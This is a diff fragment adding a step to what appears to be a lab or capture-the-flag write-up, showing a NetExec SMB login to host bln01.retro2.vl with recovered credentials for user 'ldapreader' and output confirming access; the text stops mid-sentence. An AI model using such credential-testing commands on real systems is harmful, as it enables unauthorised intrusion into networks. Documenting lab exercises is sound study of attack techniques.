@@ -341,3 +341,10 @@ End Sub
 ```
 As seen from this output there is credentials for a user account
 
+```python
+nxc smb bln01.retro2.vl -u 'ldapreader' -p 'ppYaVcB5R'
+SMB         10.129.12.5     445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True) (Null Auth:True)
+SMB         10.129.12.5     445    BLN01            [+] retro2.vl\ldapreader:ppYaVcB5R
+```
+This user has been compromised and wit
+
